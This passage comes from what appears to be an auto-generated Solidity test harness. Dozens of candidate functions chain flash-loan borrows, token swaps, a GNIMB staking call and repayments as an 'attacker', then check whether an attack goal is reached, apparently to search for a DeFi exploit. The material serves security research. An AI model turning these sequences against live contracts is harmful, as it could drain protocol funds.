        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4880(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4881(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4882(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4883(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4884(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4885(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4886(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4887(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4888(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4889(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4890(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4891(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4892(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4893(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4894(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4895(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4896(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4897(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4898(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4899(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4900(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4901(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4902(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4903(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4904(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4905(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4906(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4907(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4908(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4909(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4910(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4911(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4912(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4913(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4914(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4915(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4916(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4917(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4918(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4919(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4920(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4921(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4922(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4923(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4924(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4925(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
